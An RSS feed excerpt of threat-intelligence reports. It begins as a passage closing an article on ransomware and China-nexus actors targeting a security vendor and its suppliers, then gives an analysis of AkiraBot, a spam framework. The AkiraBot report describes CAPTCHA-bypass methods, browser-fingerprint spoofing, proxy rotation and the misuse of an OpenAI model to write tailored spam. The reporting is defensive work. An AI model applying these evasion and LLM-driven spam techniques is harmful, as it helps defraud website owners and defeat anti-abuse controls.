<p>On the defensive side, this requires constant monitoring and maintenance. Situational awareness has to be prioritized in order to maintain platform integrity and protect our legitimate customers. Our research teams are constantly monitoring for this style of abuse and access ‘leakage’, focusing on anomalous console access and site-token usage, and taking necessary actions to revoke these access vectors. This prohibits threat actors from fully interacting with the wider platform, and essentially orphans leaked agent installs, limiting the use of the agent in the hands of the threat actor.</p>
<h3>Nitrogen — Threat Operators ‘Leveling Up’</h3>
<p><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_7.jpg" alt="" width="799" height="405" class="aligncenter size-full wp-image-120056" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_7.jpg 799w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_7-300x152.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_7-768x389.jpg 768w" sizes="auto, (max-width: 799px) 100vw, 799px" /></p>
<p>Some ransomware operations are now bypassing the underground market altogether—opting instead for more tailored, concentrated-effort impersonation campaigns to gain access to security tools. This approach is epitomized by the Nitrogen ransomware group.</p>
<p>Nitrogen is believed to be operated by a well-funded Russian national with ties to earlier groups like Maze and Snatch. Rather than purchasing illicit access, Nitrogen impersonates real companies—spinning up lookalike domains, spoofed email addresses, and cloned infrastructure to convincingly pose as legitimate businesses. Nitrogen then purchases official licenses for EDR and other security products under these false pretenses.</p>
<p>This kind of social engineering is executed with precision. Nitrogen typically targets small, lightly vetted resellers—keeping interactions minimal and relying on resellers’ inconsistent KYC (Know Your Customer) practices to slip through the cracks.</p>
<p>These impersonation tactics introduce a new layer of complexity for defenders. If a threat actor successfully acquires legitimate licenses from a real vendor, they can weaponize the product to test, evade, and potentially disable protections—without ever having to engage with criminal markets.</p>
<p>This highlights a growing challenge for the security industry: reseller diligence and KYC enforcement are clearly part of the threat surface. When those controls are weak or absent, adversaries like Nitrogen gain powerful new ways to elevate their campaigns—often at a lower cost and lower risk than the black market.</p>
<h3>Lessons Learned and Internal Collaboration</h3>
<p>One of the most impactful lessons from tracking adversaries targeting our platform has been the value of deep, early collaboration across internal teams — particularly those not traditionally pulled into threat response efforts. For example, by proactively engaging with our reseller operations and customer success teams, we can surface valuable signals on questionable license requests, reseller behavior anomalies, and business inconsistencies that could have otherwise gone unnoticed.</p>
<p>By creating shared playbooks, embedding lightweight threat context, and establishing clear escalation paths, reactive processes turn into proactive signal sources. Now, suspicious licensing activity—especially when paired with evasive behaviors or mismatched domain metadata—can surface much earlier in the workflow.</p>
<p>To scale this effort, we increasingly lean into automation. By codifying threat patterns—such as domain registration heuristics, behavioral metadata mismatches, and reseller inconsistencies—organizations can automate enrichment and risk-scoring for incoming licensing requests. This can then be used to dynamically filter, flag, and in some cases, auto-block high-risk activity before it reaches onboarding.</p>
<p>The growing trend of adversaries exploiting sales processes—whether through impersonation, social engineering, or brute-force credential use—means security vendors must treat every access vector, including commercial and operational pipelines, as part of the attack surface. Making cross-functional threat awareness standard operating procedure and integrating detection logic at the edge of business systems is essential.</p>
<p>We’re continuing to improve this work in quiet ways. And while we won’t share every detection logic here (for obvious reasons), we encourage others in the industry to pursue similar internal partnerships. Sales and support teams may already be seeing signs of abuse—security teams just need to give them the lens to recognize it.</p>
<h2>Chinese State-Sponsored Adversaries</h2>
<p>One notable set of activity, occurring over the previous months, involved reconnaissance attempts against SentinelOne&#8217;s infrastructure and specific high value organizations we defend. We first became aware of this threat cluster during a 2024 intrusion conducted against an organization previously providing hardware logistics services for SentinelOne employees. We refer to this cluster of activity as PurpleHaze, with technical overlaps to multiple publicly reported Chinese APTs.</p>
<h3>The PurpleHaze Activity Cluster</h3>
<p>Over the course of months, SentinelLABS observed the threat actor conduct many intrusions, including into a South Asian government supporting entity, providing IT solutions and infrastructure across multiple sectors. This activity involved extensive infrastructure, some of which we associate with an operational relay box (ORB) network, and a Windows backdoor that we track as GoReShell. The backdoor is implemented in the Go programming language and uses functionalities from the open-source <a href="https://github.com/NHAS/reverse_ssh" target="_blank" rel="noopener noreferrer">reverse_ssh</a> tool to establish reverse SSH connections to attacker-controlled endpoints.</p>
<p>SentinelLABS collectively tracks these activities under the PurpleHaze moniker. We assess with high confidence that PurpleHaze is a China-nexus actor, loosely linking it to APT15 (also known as Nylon Typhoon, or other various outdated aliases). This adversary is known for its global targeting of critical infrastructure sectors, such as telecommunications, information technology, and government organizations – victimology that aligns with our multiple encounters with PurpleHaze.</p>
<p>We track the ORB network infrastructure observed in the attack against the South Asian government organization as being operated from China and actively used by several suspected Chinese cyberespionage actors, including APT15. The use of ORB networks is a <a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks/" target="_blank" rel="noopener noreferrer">growing</a> trend among these threat groups, since they can be rapidly expanded to create a dynamic and evolving infrastructure that makes tracking cyberespionage operations and their attribution challenging. Additionally, GoReShell malware and its variations, including the deployment mechanism on compromised machines and obfuscation techniques have been exclusively observed in intrusions that we attribute with high confidence to China-nexus actors.</p>
<h3>ShadowPad Intrusions</h3>
<p>In June 2024, approximately four months prior to PurpleHaze targeting SentinelOne, SentinelLABS observed threat actor activity targeting the same South Asian government entity that was also targeted in October 2024. Among the retrieved artifacts, we identified samples of <a href="https://www.sentinelone.com/labs/shadowpad-a-masterpiece-of-privately-sold-malware-in-chinese-espionage/" target="_blank" rel="noopener noreferrer">ShadowPad</a>, a modular backdoor platform used by multiple suspected China-nexus threat actors to conduct cyberespionage. Recent ShadowPad <a href="https://www.trendmicro.com/en_us/research/25/b/updated-shadowpad-malware-leads-to-ransomware-deployment.html" target="_blank" rel="noopener noreferrer">activity</a> has also included the deployment of ransomware, though the motive remains unclear — whether for financial gain or as a <a href="https://www.sentinelone.com/labs/chamelgang-attacking-critical-infrastructure-with-ransomware/" target="_blank" rel="noopener noreferrer">means</a> of distraction, misattribution, or removal of evidence.</p>
<p>The ShadowPad samples we retrieved were obfuscated using <a href="https://cloud.google.com/blog/topics/threat-intelligence/scatterbrain-unmasking-poisonplug-obfuscator" target="_blank" rel="noopener noreferrer">ScatterBrain</a>, an evolution of the <a href="https://www.pwc.co.uk/issues/cyber-security-services/insights/chasing-shadows.html" target="_blank" rel="noopener noreferrer">ScatterBee</a> obfuscation mechanism. Our industry partner, Google Threat Intelligence Group (GTIG), have also observed the use of ScatterBrain-obfuscated ShadowPad samples since 2022 and attribute them to clusters associated with the suspected Chinese APT actor, APT41.</p>
<figure id="attachment_120058" aria-describedby="caption-attachment-120058" style="width: 586px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_9.jpg" alt="GTIG APT41 Use of ScatterBrain" width="586" height="117" class="size-full wp-image-120058" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_9.jpg 586w, https://www.sentinelone.com/wp-content/uploads/2025/04/TopTierTarget_9-300x60.jpg 300w" sizes="auto, (max-width: 586px) 100vw, 586px" /><figcaption id="caption-attachment-120058" class="wp-caption-text">GTIG APT41 Use of ScatterBrain</figcaption></figure>
<p>Investigations continue in determining the specific actor overlap between June 2024 ShadowPad intrusions and the later PurpleHaze activity. We do not rule out the involvement of the same threat cluster, particularly given the extensive sharing of malware, infrastructure, and operational practices among Chinese threat groups, as well as the possibility of access transfer between different actors.</p>
<p>Based on private telemetry, we identified a large collection of victim organizations compromised using ScatterBrain-obfuscated ShadowPad. Between July 2024 and March 2025, this malware was used in intrusions at over 70 organizations across various regions globally, spanning sectors such as manufacturing, government, finance, telecommunications, and research. We assess that the threat actor primarily gained initial foothold in the majority of these organizations by exploiting an n-day vulnerability in CheckPoint gateway devices, which aligns with <a href="https://www.orangecyberdefense.com/global/blog/cert-news/meet-nailaolocker-a-ransomware-distributed-in-europe-by-shadowpad-and-plugx-backdoors" target="_blank" rel="noopener noreferrer">previous research</a> on ShadowPad intrusions involving the deployment of ransomware.</p>
<p>Among the victims, we identified the previously mentioned IT services and logistics organization that was at the time responsible for managing hardware logistics for SentinelOne employees. Victim organizations were promptly informed of intrusion specifics, which were swiftly investigated. At this point, it remains unclear whether the perpetrators&#8217; focus was solely on the compromised organization or if they intended to extend their reach to client organizations as well.</p>
<p>A detailed investigation into SentinelOne&#8217;s infrastructure, software, and hardware assets found no evidence of secondary compromise. Nevertheless, this case underscores the fragility of the larger supplier ecosystem that organizations depend upon and the persistent threat posed by suspected Chinese threat actors, who continuously seek to establish <a href="https://www.sentinelone.com/labs/operation-digital-eye-chinese-apt-compromises-critical-digital-infrastructure-via-visual-studio-code-tunnels/" target="_blank" rel="noopener noreferrer">strategic footholds</a> to potentially compromise downstream entities.</p>
<p>SentinelLABS will share a detailed public release on this topic in due course, providing further technical information on these activities, including observed TTPs, malware, and infrastructure.</p>
<h3>Lessons Learned While Hardening Our Operational Ecosystem</h3>
<p>Our analysis of the PurpleHaze cluster, and more specifically the potential indirect risk introduced via compromised third-party service providers, has reinforced several key insights around operational security and supply chain monitoring. Even when our own infrastructure remained untouched, the targeting of an external service provider previously associated with business logistics surfaced important considerations.</p>
<p>One immediate reminder is the necessity of maintaining real-time awareness not only over internal assets but also over adjacent service providers—particularly those with past or current access to sensitive employee devices or logistical information. When incidents occur near your supply chain, don’t wait for confirmation of compromise. Proactively trigger internal reviews of asset inventories, procurement workflows, OS images and onboarding deployment scripts, and segmentation policies to quickly identify any exposure pathways and reduce downstream risk.</p>
<p>This leads to several defense recommendations:</p>
<ul>
<li aria-level="1"><strong>Distribute Threat Intelligence Across Operational Stakeholders</strong><br />
Organizations should proactively share campaign-level threat intelligence with business units beyond the traditional security org—particularly those managing vendor relationships, logistics, and physical operations. Doing so enables faster detection of overlap with compromised third parties and supports early reassessment of exposure through external partners.</li>
<li aria-level="1"><strong>Integrate Threat Context Into Asset Attribution Workflows</strong><br />
Infrastructure and IT teams should collaborate with threat intelligence functions to embed threat-aware metadata into asset inventories. This enables more responsive scoping during incident response and enhances the ability to trace supply chain touchpoints that may be at risk.</li>
<li aria-level="1"><strong>Expand Supply Chain Threat Modeling</strong><br />
Organizations should refine their threat modeling processes to explicitly account for upstream supply chain threats, especially those posed by nation-state actors with a history of leveraging contractors, vendors, or logistics partners as indirect access vectors. Tailoring models to include adversary-specific tradecraft enables earlier identification of unconventional intrusion pathways.</li>
</ul>
<p>While attribution continues to evolve and victim impact remains diverse, one thing is clear: well-resourced threat actors are increasingly leaning on indirect routes into enterprise environments. Investigations like this help us sharpen our defenses—not just around traditional digital perimeters but around the full operational footprint of our organization.</p>
<h2>The Strategic Value of Cyber Threat Intelligence</h2>
<p>In today’s threat landscape, threat intelligence has evolved from a niche function into an essential pillar of enterprise defense—particularly for private sector organizations operating in the security space. As threat actors increasingly target security vendors for insider access, abuse of legitimate channels, and supply chain infiltration, the role of CTI in anticipating and disrupting these tactics has become more critical than ever.</p>
<p>One of the most tangible examples of this value is in internal talent acquisition and insider threat defense. Intelligence has become a frontline asset in identifying attempts by North Korean IT workers and other state-backed operatives to embed themselves in organizations under false pretenses. By flagging suspicious applicant patterns, cross-referencing alias histories, and tracking known tradecraft, CTI teams help hiring managers and HR avoid potential insider incidents before they start.</p>
<p>Our CTI capabilities must also directly support sales and channel operations. As criminal groups increasingly impersonate legitimate businesses to acquire security products through trusted resellers, intelligence plays a key role in verifying customer legitimacy and identifying anomalous purchase behaviors. By integrating intelligence insights into pre-sale vetting workflows, a crucial layer of protection is helping to ensure adversaries cannot simply “buy” their way into our technology stack.</p>
<p>Internally, threat intelligence informs and enhances how we defend our own technology and supply chain against highly targeted APT activity. From understanding how adversaries reverse-engineer our software to uncovering which parts of our technology stack they seek to compromise, CTI enables proactive hardening, smarter telemetry prioritization, and meaningful collaboration with product and engineering teams. In essence, intelligence acts as an early-warning system and a strategic guide—ensuring our defenses stay one step ahead of evolving threats.</p>
<p>Across every function—whether it&#8217;s HR, Sales, Engineering, or Security—cyber threat intelligence is no longer a backroom function. It&#8217;s embedded in the fabric of how we defend, operate, and grow as a business.</p>
]]></content:encoded>
					
		
		
		<enclosure url="https://www.sentinelone.com/wp-content/uploads/2025/04/TopTier_soc_ftr.jpg" length="224159" type="image/jpeg" />	</item>
		<item>
		<title>AkiraBot &#124; AI-Powered Bot Bypasses CAPTCHAs, Spams Websites At Scale</title>
		<link>https://www.sentinelone.com/labs/akirabot-ai-powered-bot-bypasses-captchas-spams-websites-at-scale/</link>
		
		<dc:creator><![CDATA[Alex Delamotte &amp; Jim Walter]]></dc:creator>
		<pubDate>Wed, 09 Apr 2025 15:00:36 +0000</pubDate>
				<category><![CDATA[MalSpam]]></category>
		<category><![CDATA[OpenAI]]></category>
		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=117809</guid>

					<description><![CDATA[AkiraBot uses OpenAI to generate custom outreach messages to spam chat widgets and website contact forms at scale.]]></description>
										<content:encoded><![CDATA[<h2>Executive Summary</h2>
<ul>
<li aria-level="1">AkiraBot is a framework used to spam website chats and contact forms <em>en masse</em> to promote a low-quality SEO service.</li>
<li aria-level="1">SentinelLABS assesses that AkiraBot has targeted more than 400,000 websites and successfully spammed at least 80,000 websites since September 2024.</li>
<li aria-level="1">The bot uses OpenAI to generate custom outreach messages based on the purpose of the website.</li>
<li aria-level="1">The framework is modular and sophisticated compared to typical spam tools, employing multiple CAPTCHA bypass mechanisms &amp; network detection evasion techniques.</li>
</ul>
<h2>Overview</h2>
<p>Whenever a new form of digital communications becomes prevalent, actors inevitably adopt it for spam to try to profit from unsuspecting users. Email has been the perennial choice for spam delivery, but the prevalence of new communications platforms has expanded the spam attack surface considerably.</p>
<p>This report explores AkiraBot, a Python framework that targets small to medium sized business website contact forms and chat widgets. AkiraBot is designed to post AI-generated spam messages tailored to the targeted website’s content that shill the services for a dubious Search Engine Optimization (SEO) network. The use of LLM-generated content likely helps these messages bypass spam filters, as the spam content is different each time a message is generated. The framework also rotates which attacker-controlled domain is supplied in the messages, further complicating spam filtering efforts.</p>
<p>The bot creator has invested significant effort into evading CAPTCHA filters as well as avoiding network detections by relying on a proxy service generally marketed towards advertisers–though the service has had considerable interest and use by cybercriminal actors.</p>
<p>AkiraBot is not related to the ransomware group Akira; this name was chosen due to the bot’s consistent use of domains that use “Akira” as the SEO service brand.</p>
<h2>Script Execution and Website Feature Targeting</h2>
<p>SentinelLABS identified several archives containing scripts related to this framework with file timestamps dating back to September 2024. The oldest archive refers to the bot as Shopbot, likely a reference to its targeting of websites using Shopify. As the tool evolved, the targeting expanded to include websites built using GoDaddy and Wix, as well as generic website contact forms, which includes websites built using Squarespace, and likely other technologies. These technologies are primarily used by small- to medium-sized businesses for their ease in enabling website development with integrations for eCommerce, website content management, and business service offerings.</p>
<p>There are many versions of this tool with file timestamps in the archives indicating activity between September 2024 to present. Each version uses one of two hardcoded OpenAI API keys and the same proxy credentials and test sites, which links the archives despite the disparate naming conventions. We identified AkiraBot-related archives that had the following root directory names:</p>
<ul>
<li aria-level="1">bubble_working_clone</li>
<li aria-level="1">fingerprints-server</li>
<li aria-level="1">GoDaddy</li>
<li aria-level="1">NextCaptcha and FastCaptcha</li>
<li aria-level="1">NextCaptchaBot-v6</li>
<li aria-level="1">override</li>
<li aria-level="1">petar_bot</li>
<li aria-level="1">shopbotpyv2</li>
<li aria-level="1">SHOPIFY_SYSTEM_UPDATED</li>
<li aria-level="1">updatedpybot</li>
<li aria-level="1">wix</li>
<li aria-level="1">wixbot</li>
<li aria-level="1">WORKING_FOLDER</li>
</ul>
<p>Additionally, logs from the tool reveal that the operator ran it from the following paths, suggesting that they are most likely using Windows Server systems based on the Administrator username being the most prevalent:</p>
<pre>
 	C:/Users/Administrator/Desktop/
 	C:/Users/Administrator/Downloads/
 	C:/Users/Usuario/Desktop/ - only appears in the archive named GoDaddy
</pre>
<p>Originally, AkiraBot spammed website contact forms enticing the site owner to purchase SEO services. Newer versions of AkiraBot have also targeted the Live Chat widgets integrated into many websites, including Reamaze widgets.</p>
<figure id="attachment_117818" aria-describedby="caption-attachment-117818" style="width: 929px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_6.jpg" alt="_submit_old_website function in v14.py" width="929" height="363" class="size-full wp-image-117818" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_6.jpg 929w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_6-300x117.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_6-768x300.jpg 768w" sizes="auto, (max-width: 929px) 100vw, 929px" /><figcaption id="caption-attachment-117818" class="wp-caption-text"><em>_submit_old_website</em> function in <em>v14.py</em></figcaption></figure>
<p>The bot has a GUI that shows success metrics and lets the operator choose a target list to run against. The GUI lets the operator customize how many threads are running at once, a feature the bot uses to target many sites concurrently.</p>
<figure id="attachment_117827" aria-describedby="caption-attachment-117827" style="width: 1002px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_18.jpg" alt="AkiraBot GUI" width="1002" height="749" class="size-full wp-image-117827" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_18.jpg 1002w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_18-300x224.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_18-768x574.jpg 768w" sizes="auto, (max-width: 1002px) 100vw, 1002px" /><figcaption id="caption-attachment-117827" class="wp-caption-text">AkiraBot GUI</figcaption></figure>
<h3>Spam Message Generation</h3>
<p>Searching for websites referencing AkiraBot domains shows that the bot previously spammed websites in a way that the message was indexed by search engines.</p>
<figure id="attachment_117836" aria-describedby="caption-attachment-117836" style="width: 669px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_10.jpg" alt="Google search results containing useakira[.]com" width="669" height="566" class="size-full wp-image-117836" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_10.jpg 669w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_10-300x254.jpg 300w" sizes="auto, (max-width: 669px) 100vw, 669px" /><figcaption id="caption-attachment-117836" class="wp-caption-text">Google search results containing <em>useakira[.]com</em></figcaption></figure>
<figure id="attachment_117824" aria-describedby="caption-attachment-117824" style="width: 1208px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_20.jpg" alt="Spam comment on website from 2023 and content from AkiraBot templates.txt file" width="1208" height="578" class="size-full wp-image-117824" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_20.jpg 1208w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_20-300x144.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_20-1024x490.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_20-768x367.jpg 768w" sizes="auto, (max-width: 1208px) 100vw, 1208px" /><figcaption id="caption-attachment-117824" class="wp-caption-text">Spam comment on website from 2023 and content from AkiraBot <em>templates.txt</em> file</figcaption></figure>
<p>AkiraBot creates custom spam messages for targeted websites by processing a template that contains a generic outline of the type of message the bot should send.</p>
<figure id="attachment_117834" aria-describedby="caption-attachment-117834" style="width: 1038px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_12.jpg" alt="Spam message template" width="1038" height="342" class="size-full wp-image-117834" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_12.jpg 1038w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_12-300x99.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_12-1024x337.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_12-768x253.jpg 768w" sizes="auto, (max-width: 1038px) 100vw, 1038px" /><figcaption id="caption-attachment-117834" class="wp-caption-text">Spam message template</figcaption></figure>
<p>The template is processed by a prompt sent to the OpenAI chat API to generate a customized outreach message based on the contents of the website. The OpenAI client uses model gpt-4o-mini and is assigned the role &#8220;<i>You are a helpful assistant that generates marketing messages.</i>&#8221; and the prompt instructs the LLM to replace the variables <code>&lt;WEBSITE_NAME></code> and <code>&lt;KEYWORD></code> with the site name provided at runtime.</p>
<figure id="attachment_117832" aria-describedby="caption-attachment-117832" style="width: 1186px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_14.jpg" alt="AI Chat prompt from v10.py" width="1186" height="677" class="size-full wp-image-117832" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_14.jpg 1186w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_14-300x171.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_14-1024x585.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_14-768x438.jpg 768w" sizes="auto, (max-width: 1186px) 100vw, 1186px" /><figcaption id="caption-attachment-117832" class="wp-caption-text">AI Chat prompt from <em>v10.py</em></figcaption></figure>
<p>The <code>&lt;KEYWORD></code> is generated by processing the <code>{context}</code> variable, which contains text scraped from the targeted website via <a href="https://www.crummy.com/software/BeautifulSoup/" target="_blank">BeautifulSoup</a>, a library that transforms raw HTML code into human–or LLM–readable text.</p>
<figure id="attachment_117817" aria-describedby="caption-attachment-117817" style="width: 1059px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_7.jpg" alt="AkiraBot generate_message function" width="1059" height="680" class="size-full wp-image-117817" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_7.jpg 1059w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_7-300x193.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_7-1024x658.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_7-768x493.jpg 768w" sizes="auto, (max-width: 1059px) 100vw, 1059px" /><figcaption id="caption-attachment-117817" class="wp-caption-text">AkiraBot&#8217;s <em>generate_message</em> function</figcaption></figure>
<p>The resulting message includes a brief description of the targeted website, making the message seem curated. The benefit of generating each message using an LLM is that the message content is unique and filtering against spam becomes more difficult compared to using a consistent message template which can trivially be filtered.</p>
<figure id="attachment_117835" aria-describedby="caption-attachment-117835" style="width: 1059px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_11.jpg" alt="Logged AI-generated outreach messages in submissions.csv" width="1059" height="670" class="size-full wp-image-117835" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_11.jpg 1059w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_11-300x190.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_11-1024x648.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_11-768x486.jpg 768w" sizes="auto, (max-width: 1059px) 100vw, 1059px" /><figcaption id="caption-attachment-117835" class="wp-caption-text">Logged AI-generated outreach messages in <em>submissions.csv</em></figcaption></figure>
<h2>CAPTCHA Bypass &amp; Network Evasion Techniques</h2>
<h3>CAPTCHA Bypass</h3>
<p>AkiraBot puts significant emphasis on evading CAPTCHAs so that it can spam websites at scale. The targeted CAPTCHA services include hCAPTCHA and reCAPTCHA, including Cloudflare’s hCAPTCHA service in certain versions of the tool.</p>
<p>We identified an archive with files for CAPTCHA-related servers and browser fingerprints, which allow the bot’s web traffic to mimic a legitimate end user. The archives contain a fingerprint server that runs on the same system as the other AkiraBot tools and intercepts the website loading processes using Selenium <a href="https://www.selenium.dev/documentation/webdriver/" target="_blank" rel="noopener noreferrer">WebDriver</a>, an automation framework that simulates user browsing activity.</p>
<p>The <code>inject.js</code> script injects code into the targeted website’s Document Object Model (DOM) which enables the tool to modify how the website loads in real time and change behaviors. <code>inject.js</code> manipulates values in the session via a headless Chrome instance that makes the session appear like an end user’s browser to the webserver. The script modifies multiple browser attributes that webservers use to identify the nature of the browser viewing the website, including:</p>
<ul>
<li aria-level="1">Audio Context and Voice engines, which are used to profile whether a session is headless or a real browser</li>
<li aria-level="1">Graphics rendering, including canvas and WebGL attributes</li>
<li aria-level="1">Installed fonts</li>
<li aria-level="1"><a href="https://developer.mozilla.org/en-US/docs/Web/API/Navigator" target="_blank" rel="noopener noreferrer">Navigator</a> objects, which provide a wealth of profiling information, such as browser type, operating system &amp; architecture, geolocation, hardware details, languages installed, and browser privacy settings</li>
<li aria-level="1">System memory, storage, and CPU profile</li>
<li aria-level="1">Timezone</li>
</ul>
<p>The bot uses several CAPTCHA bypassing services, including Capsolver, FastCaptcha, and NextCaptcha, which are failover services for when browser emulation is insufficient to interact with the targeted website.</p>
<figure id="attachment_117819" aria-describedby="caption-attachment-117819" style="width: 1254px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_4.jpg" alt="FastCaptcha token generator function in v10.py" width="1254" height="630" class="size-full wp-image-117819" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_4.jpg 1254w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_4-300x151.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_4-1024x514.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_4-768x386.jpg 768w" sizes="auto, (max-width: 1254px) 100vw, 1254px" /><figcaption id="caption-attachment-117819" class="wp-caption-text">FastCaptcha token generator function in <em>v10.py</em></figcaption></figure>
<p>AkiraBot also runs a headless Chrome instance to refresh values for <a href="https://support.reamaze.com/kb/automation/enable-ai-spam-filtering-for-chat-and-email-channels" target="_blank" rel="noopener noreferrer">Reamaze</a> tokens periodically. Reamaze provides websites with customer support chat integrations, making this another targeted feature. The service also offers spam filters for chats on its platform, indicating that this is a known vector for spam attacks.</p>
<figure id="attachment_117821" aria-describedby="caption-attachment-117821" style="width: 736px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_23.jpg" alt="Reamaze token handling function" width="736" height="419" class="size-full wp-image-117821" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_23.jpg 736w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_23-300x171.jpg 300w" sizes="auto, (max-width: 736px) 100vw, 736px" /><figcaption id="caption-attachment-117821" class="wp-caption-text">Reamaze token handling function</figcaption></figure>
<h3>Network Evasion Techniques</h3>
<p>AkiraBot uses many different proxy hosts to evade network detections and diversify the source of where its traffic comes from. In each archive SentinelLABS analyzed, AkiraBot used the SmartProxy service. SmartProxy’s website claims that its proxies are ethically sourced and that they provide data center, mobile, and residential proxies. Each version of the bot uses the same proxy credentials, suggesting the same actor is behind each iteration.</p>
<figure id="attachment_117826" aria-describedby="caption-attachment-117826" style="width: 649px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_19.jpg" alt="get_random_proxy function in The_NextCaptcha_Bot.py" width="649" height="288" class="size-full wp-image-117826" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_19.jpg 649w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_19-300x133.jpg 300w" sizes="auto, (max-width: 649px) 100vw, 649px" /><figcaption id="caption-attachment-117826" class="wp-caption-text"><em>get_random_proxy</em> function in <em>The_NextCaptcha_Bot.py</em></figcaption></figure>
<p>While SmartProxy is a service that seems to operate within legal boundaries, it is worth noting that it has regularly had the attention of cybercriminals. The BlackBasta ransomware leaks referenced an exchange of SmartProxy credentials, for example.</p>
<figure id="attachment_117828" aria-describedby="caption-attachment-117828" style="width: 1216px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_17.jpg" alt="SmartProxy credentials from BlackBasta leaks" width="1216" height="306" class="size-full wp-image-117828" srcset="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_17.jpg 1216w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_17-300x75.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_17-1024x258.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_17-768x193.jpg 768w" sizes="auto, (max-width: 1216px) 100vw, 1216px" /><figcaption id="caption-attachment-117828" class="wp-caption-text">SmartProxy credentials from BlackBasta leaks</figcaption></figure>
<h2>Logging &amp; Success</h2>
<p>AkiraBot logs its spam progress to <code>submissions.csv</code>, which sometimes includes the AI-generated spam message contents as well. The <code>submissions.csv</code> file from the January 2025 archives show more than 80,000 unique domains that were successfully spammed. The script also logs failed attempts in <code>failed.txt</code> and <code>failed_old.txt</code>. The January 2025 archives showed that only 11,000 domains had failed, including previous runs of the tool. We analyzed all <code>submissions.csv</code> files; deduplicating the results revealed that more than 420,000 unique domains were targeted in total.</p>
<p>Two versions of AkiraBot used a Telegram bot for logging success metrics. The scripts <code>monitor.py</code> and <code>monitor_random.py</code> would collect success metrics from the bot and post them to a Telegram channel via API.</p>
